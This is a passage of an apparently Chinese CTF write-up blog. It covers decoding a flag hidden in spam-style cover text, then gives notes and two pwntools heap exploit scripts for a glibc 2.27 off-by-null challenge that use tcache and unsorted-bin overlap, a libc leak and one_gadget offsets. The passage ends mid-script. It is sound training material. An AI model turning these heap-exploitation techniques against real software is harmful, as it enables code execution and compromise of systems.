class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs tp">Dear E-Commerce professional ; This letter was specially<br>selected to be sent to you . We will comply with all<br>removal requests <span class="hljs-comment">! This mail is being sent in compliance</span><br><span class="hljs-comment">with Senate bill 1620 ;</span> Title <span class="hljs-number">3</span> ; Section <span class="hljs-number">308</span> <span class="hljs-comment">! This</span><br><span class="hljs-comment">is not a get rich scheme ! Why work for somebody else</span><br><span class="hljs-comment">when you can become rich in 27 MONTHS . Have you ever</span><br><span class="hljs-comment">noticed more people than ever are surfing the web and</span><br><span class="hljs-comment">more people than ever are surfing the web . Well, now</span><br><span class="hljs-comment">is your chance to capitalize on this ! WE will help</span><br><span class="hljs-comment">YOU use credit cards on your website plus turn your</span><br><span class="hljs-comment">business into an E-BUSINESS . You are guaranteed to</span><br><span class="hljs-comment">succeed because we take all the risk ! But don&#x27;t believe</span><br><span class="hljs-comment">us . Ms Simpson who resides in Maine tried us and says</span><br><span class="hljs-comment">&quot;I&#x27;ve been poor and I&#x27;ve been rich - rich is better&quot;</span><br><span class="hljs-comment">. We are a BBB member in good standing ! We urge you</span><br><span class="hljs-comment">to contact us today for your own future financial well-being</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 50%</span><br><span class="hljs-comment">. Thank-you for your serious consideration of our offer</span><br><span class="hljs-comment">! Dear Friend ;</span> This letter was specially selected<br>to be sent to you <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2316 ;</span> Title <span class="hljs-number">8</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! Do NOT confuse</span><br><span class="hljs-comment">us with Internet scam artists . Why work for somebody</span><br><span class="hljs-comment">else when you can become rich as few as 24 WEEKS !</span><br><span class="hljs-comment">Have you ever noticed more people than ever are surfing</span><br><span class="hljs-comment">the web plus how many people you know are on the Internet</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">200% and turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">are guaranteed to succeed because we take all the risk</span><br><span class="hljs-comment">. But don&#x27;t believe us . Mrs Simpson of Illinois tried</span><br><span class="hljs-comment">us and says &quot;Now I&#x27;m rich many more things are possible&quot;</span><br><span class="hljs-comment">! We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! Do not delay - order today . Sign up a friend</span><br><span class="hljs-comment">and your friend will be rich too . Warmest regards</span><br><span class="hljs-comment">! Dear Sir or Madam ;</span> Especially for you - this hot<br>information . We will comply with all removal requests<br><span class="hljs-comment">! This mail is being sent in compliance with Senate</span><br><span class="hljs-comment">bill 1916 ;</span> Title <span class="hljs-number">2</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! THIS IS NOT MULTI-LEVEL</span><br><span class="hljs-comment">MARKETING ! Why work for somebody else when you can</span><br><span class="hljs-comment">become rich in 89 days . Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone plus most everyone has a cellphone</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU sell more &amp; SELL MORE . You can begin</span><br><span class="hljs-comment">at absolutely no cost to you . But don&#x27;t believe us</span><br><span class="hljs-comment">. Mr Jones of Minnesota tried us and says &quot;I was skeptical</span><br><span class="hljs-comment">but it worked for me&quot; ! We assure you that we operate</span><br><span class="hljs-comment">within all applicable laws ! We beseech you - act now</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 90%</span><br><span class="hljs-comment">. Thanks . Dear Cybercitizen ;</span> Your email address has<br>been submitted to us indicating your interest in our<br>newsletter . If you are not interested in our publications<br>and wish to be removed from our lists, simply do NOT<br>respond and ignore this mail <span class="hljs-comment">! This mail is being sent</span><br><span class="hljs-comment">in compliance with Senate bill 2016 , Title 2 , Section</span><br><span class="hljs-comment">304 . This is different than anything else you&#x27;ve seen</span><br><span class="hljs-comment">! Why work for somebody else when you can become rich</span><br><span class="hljs-comment">in 48 weeks ! Have you ever noticed more people than</span><br><span class="hljs-comment">ever are surfing the web plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU deliver goods right to the customer&#x27;s</span><br><span class="hljs-comment">doorstep &amp; turn your business into an E-BUSINESS .</span><br><span class="hljs-comment">You can begin at absolutely no cost to you . But don&#x27;t</span><br><span class="hljs-comment">believe us . Ms Anderson who resides in New York tried</span><br><span class="hljs-comment">us and says &quot;My only problem now is where to park all</span><br><span class="hljs-comment">my cars&quot; ! We are a BBB member in good standing . If</span><br><span class="hljs-comment">not for you then for your LOVED ONES - act now ! Sign</span><br><span class="hljs-comment">up a friend and you&#x27;ll get a discount of 20% ! God</span><br><span class="hljs-comment">Bless . Dear Colleague , Your email address has been</span><br><span class="hljs-comment">submitted to us indicating your interest in our publication</span><br><span class="hljs-comment">. If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our mailing list . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 2416</span><br><span class="hljs-comment">, Title 9 ;</span> Section <span class="hljs-number">308</span> <span class="hljs-comment">! This is NOT unsolicited bulk</span><br><span class="hljs-comment">mail . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich within 24 MONTHS ! Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone and people love convenience</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">190% and sell more ! The best thing about our system</span><br><span class="hljs-comment">is that it is absolutely risk free for you ! But don&#x27;t</span><br><span class="hljs-comment">believe us . Mrs Anderson of Indiana tried us and says</span><br><span class="hljs-comment">&quot;Now I&#x27;m rich, Rich, RICH&quot; . This offer is 100% legal</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">. Sign up a friend and your friend will be rich too</span><br><span class="hljs-comment">. God Bless ! Dear Colleague ;</span> We know you are interested<br>in receiving amazing information <span class="hljs-comment">! If you are not interested</span><br><span class="hljs-comment">in our publications and wish to be removed from our</span><br><span class="hljs-comment">lists, simply do NOT respond and ignore this mail !</span><br><span class="hljs-comment">This mail is being sent in compliance with Senate bill</span><br><span class="hljs-comment">1619 , Title 7 , Section 303 ! This is not multi-level</span><br><span class="hljs-comment">marketing . Why work for somebody else when you can</span><br><span class="hljs-comment">become rich within 37 days ! Have you ever noticed</span><br><span class="hljs-comment">nobody is getting any younger plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span class="hljs-comment">140% plus deliver goods right to the customer&#x27;s doorstep</span><br><span class="hljs-comment">. You can begin at absolutely no cost to you . But</span><br><span class="hljs-comment">don&#x27;t believe us ! Mrs Simpson of Illinois tried us</span><br><span class="hljs-comment">and says &quot;I was skeptical but it worked for me&quot; . We</span><br><span class="hljs-comment">are licensed to operate in all states ! Because the</span><br><span class="hljs-comment">Internet operates on &quot;Internet time&quot; you must make</span><br><span class="hljs-comment">a commitment soon ! Sign up a friend and you get half</span><br><span class="hljs-comment">off ! Thank-you for your serious consideration of our</span><br><span class="hljs-comment">offer . Dear Friend ;</span> We know you are interested in<br>receiving amazing info <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2716 , Title 5 , Section 303 ! This is</span><br><span class="hljs-comment">not a get rich scheme . Why work for somebody else</span><br><span class="hljs-comment">when you can become rich within 52 days ! Have you</span><br><span class="hljs-comment">ever noticed how many people you know are on the Internet</span><br><span class="hljs-comment">and the baby boomers are more demanding than their</span><br><span class="hljs-comment">parents ! Well, now is your chance to capitalize on</span><br><span class="hljs-comment">this . WE will help YOU decrease perceived waiting</span><br><span class="hljs-comment">time by 170% and turn your business into an E-BUSINESS</span><br><span class="hljs-comment">. You are guaranteed to succeed because we take all</span><br><span class="hljs-comment">the risk ! But don&#x27;t believe us ! Mrs Anderson who</span><br><span class="hljs-comment">resides in Alabama tried us and says &quot;Now I&#x27;m rich,</span><br><span class="hljs-comment">Rich, RICH&quot; ! We are a BBB member in good standing</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">! Sign up a friend and you get half off ! Thanks .</span><br><span class="hljs-comment">Dear Salaryman ;</span> Especially for you - this red-hot<br>news <span class="hljs-comment">! We will comply with all removal requests . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 1618</span><br><span class="hljs-comment">, Title 4 , Section 308 . THIS IS NOT MULTI-LEVEL MARKETING</span><br><span class="hljs-comment">. Why work for somebody else when you can become rich</span><br><span class="hljs-comment">inside 27 days ! Have you ever noticed nearly every</span><br><span class="hljs-comment">commercial on television has a .com on in it &amp; nearly</span><br><span class="hljs-comment">every commercial on television has a .com on in it</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span class="hljs-comment">180% plus turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">can begin at absolutely no cost to you ! But don&#x27;t</span><br><span class="hljs-comment">believe us ! Prof Ames who resides in Washington tried</span><br><span class="hljs-comment">us and says &quot;I was skeptical but it worked for me&quot;</span><br><span class="hljs-comment">. We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! We implore you - act now . Sign up a friend</span><br><span class="hljs-comment">and you&#x27;ll get a discount of 10% . Thank-you for your</span><br><span class="hljs-comment">serious consideration of our offer ! Dear Friend ;</span><br>This letter was specially selected to be sent to you<br><span class="hljs-comment">! If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our club ! This mail is</span><br><span class="hljs-comment">being sent in compliance with Senate bill 1622 , Title</span><br><span class="hljs-comment">7 ;</span> Section <span class="hljs-number">303</span> <span class="hljs-comment">! Do NOT confuse us with Internet scam</span><br><span class="hljs-comment">artists . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich in 10 weeks ! Have you ever noticed people will</span><br><span class="hljs-comment">do almost anything to avoid mailing their bills &amp; people</span><br><span class="hljs-comment">love convenience ! Well, now is your chance to capitalize</span><br><span class="hljs-comment">on this . WE will help YOU turn your business into</span><br><span class="hljs-comment">an E-BUSINESS &amp; SELL MORE . You can begin at absolutely</span><br><span class="hljs-comment">no cost to you ! But don&#x27;t believe us . Mr Ames of</span><br><span class="hljs-comment">Louisiana tried us and says &quot;Now I&#x27;m rich, Rich, RICH&quot;</span><br><span class="hljs-comment">. We are licensed to operate in all states . We BESEECH</span><br><span class="hljs-comment">you - act now . Sign up a friend and you&#x27;ll get a discount</span><br><span class="hljs-comment">of 50% ! Thank-you for your serious consideration of</span><br><span class="hljs-comment">our offer .</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">hgame&#123;0k_you_s0lve_al1_th3_secr3t&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="weel3"><a href="#weel3" class="headerlink" title="weel3"></a>weel3</h2><h3 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h3><h4 id="你满了-那我就漫出来了"><a href="#你满了-那我就漫出来了" class="headerlink" title="你满了,那我就漫出来了!"></a>你满了,那我就漫出来了!</h4><ul>
<li><p>2.27的off_by_null(但附件应该是有什么问题 运行不了 换libc也找不到)<br>那就自己重新编译一个把 大部分都一样了</p>
</li>
<li><p>unsorttedbin是先进先出</p>
</li>
<li><pre><code class="shell">p &amp;main_arena 或 p &amp;__malloc_hook是可以的
x/30gx &amp;main_arena不行
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>* 先是用easyheap的方法打了一下 可以泄露libc 但是double free的时候会检测到  应该需要把exp稍微调整一下<br>  也有可能是easyheap的小版本号比较低 没有检测 <span class="hljs-number">1.3</span>以后就更新了 这样的话 这种打法应该就打不通了<br><br>  &gt;现在，调用`int_free`时，将会检查整个`Tcache`链表，如果发现将要释放的`chunk`已存在于链表中将会报错`<span class="hljs-built_in">free</span>(): double free detected in tcache <span class="hljs-number">2</span>`。<br>  &gt;<br>  &gt;https://www.anquanke.com/post/id/<span class="hljs-number">219292</span>#h3-<span class="hljs-number">7</span><br><br>  ```python<br>  from pwn import *<br>  <br>  io = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>  elf = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>  libc = elf.libc<br>  <span class="hljs-built_in">context</span>(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>  <br>  def <span class="hljs-built_in">add</span>(indx, size, content):<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;choice:&quot;</span>, b<span class="hljs-string">&#x27;1&#x27;</span>)<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br>  <br>  def <span class="hljs-built_in">show</span>(indx):<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;choice:&quot;</span>, b<span class="hljs-string">&#x27;2&#x27;</span>)<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(indx))<br>  <br>  def <span class="hljs-built_in">delete</span>(indx):<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;choice:&#x27;</span>, b<span class="hljs-string">&#x27;3&#x27;</span>)<br>     io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>     <span class="hljs-built_in">add</span>(i, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>x10, b<span class="hljs-string">&#x27;protect&#x27;</span>)<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>     <span class="hljs-built_in">delete</span>(i)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">9</span>)<br>  # chunk678合并<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">6</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">7</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">8</span>)<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>     <span class="hljs-built_in">add</span>(i, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;tcache&#x27;</span>)<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;unsorted&#x27;</span>)  # chunk6<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;unsorted&#x27;</span>)  # chunk7<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;unsorted&#x27;</span>)  # chunk8<br>  <br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>     <span class="hljs-built_in">delete</span>(i)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">8</span>)   # chunk7<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">7</span>)   # chunk6<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>xf8, b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>xf0+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x200))    # 先取tcache中的chunk7<br>  # offbynull 修改chunk8的inuse位<br>  <br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">6</span>)   # 填满tcache<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">9</span>)   # 合并<span class="hljs-number">0</span>x300 overlapping<br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>     <span class="hljs-built_in">add</span>(i+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>xf8, b<span class="hljs-string">&#x27;tcache&#x27;</span>)<br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>xf8, b<span class="hljs-string">&#x27;chunk6&#x27;</span>)<br>  <br>  <span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br>  unsorted = <span class="hljs-built_in">u64</span>(io.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>  base = unsorted - <span class="hljs-number">0</span>x70 - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>  <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>  ogg = [<span class="hljs-number">0</span>x4f2a5, <span class="hljs-number">0</span>x4f302, <span class="hljs-number">0</span>x10a2fc]<br>  onegadget = base + ogg[<span class="hljs-number">0</span>]<br>  <br>  <br>  <span class="hljs-built_in">add</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xf0, b<span class="hljs-string">&#x27;aa&#x27;</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">2</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">0</span>)<br>  <span class="hljs-built_in">delete</span>(<span class="hljs-number">9</span>)<br>  # <span class="hljs-built_in">free</span>(): double free detected in tcache <span class="hljs-number">2</span><br>  <br>  <br>  <br>  gdb.<span class="hljs-built_in">attach</span>(io)<br>  <span class="hljs-built_in">pause</span>()<br>  <br>  io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>一位师傅的：利用off_by_one还可以溢出 uaf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># io = remote(&quot;106.14.57.14&quot;, 31809)</span><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>        gdb.attach(io)<br>        pause()<br><br>sd     = <span class="hljs-keyword">lambda</span> s    : io.send(s)<br>sda    = <span class="hljs-keyword">lambda</span> s, n : io.sendafter(s, n)<br>sl     = <span class="hljs-keyword">lambda</span> s    : io.sendline(s)<br>sla    = <span class="hljs-keyword">lambda</span> s, n : io.sendlineafter(s, n)<br>rc     = <span class="hljs-keyword">lambda</span> n    : io.recv(n)<br>rl     = <span class="hljs-keyword">lambda</span>      : io.recvline()<br>rut    = <span class="hljs-keyword">lambda</span> s    : io.recvuntil(s, drop=<span class="hljs-literal">True</span>)<br>ruf    = <span class="hljs-keyword">lambda</span> s    : io.recvuntil(s, drop=<span class="hljs-literal">False</span>)<br>addr4  = <span class="hljs-keyword">lambda</span> n    : u32(io.recv(n, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>addr8  = <span class="hljs-keyword">lambda</span> n    : u64(io.recv(n, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>addr32 = <span class="hljs-keyword">lambda</span> s    : u32(io.recvuntil(s, drop=<span class="hljs-literal">True</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>addr64 = <span class="hljs-keyword">lambda</span> s    : u64(io.recvuntil(s, drop=<span class="hljs-literal">True</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>byte   = <span class="hljs-keyword">lambda</span> n    : <span class="hljs-built_in">str</span>(n).encode()<br>info   = <span class="hljs-keyword">lambda</span> s, n : <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[&quot;</span>+s+<span class="hljs-string">&quot; -&gt; &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(n))+<span class="hljs-string">&quot;]\033[0m&quot;</span>)<br>sh     = <span class="hljs-keyword">lambda</span>      : io.interactive()<br>menu   = <span class="hljs-string">b&#x27;Your choice:&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, data</span>):<br>        sla(menu, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, byte(idx))<br>        sla(<span class="hljs-string">b&#x27;Size: &#x27;</span>, byte(size))<br>        sda(<span class="hljs-string">b&#x27;Content: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>        sla(menu, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, byte(idx))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>        sla(menu, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Index: &#x27;</span>, byte(idx))<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,  <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">8</span>,  <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;B&#x27;</span>)<br>add(<span class="hljs-number">9</span>,  <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;B&#x27;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;C&#x27;</span>)  <span class="hljs-comment"># protect</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        dele(i)<br><br>dele(<span class="hljs-number">7</span>)  <span class="hljs-comment"># unsorted</span><br>dele(<span class="hljs-number">9</span>)  <span class="hljs-comment"># tcache_0x30</span><br><br><span class="hljs-comment"># 合并chunk789</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x10</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x30</span>))<br>dele(<span class="hljs-number">10</span>) <span class="hljs-comment"># overlapping</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 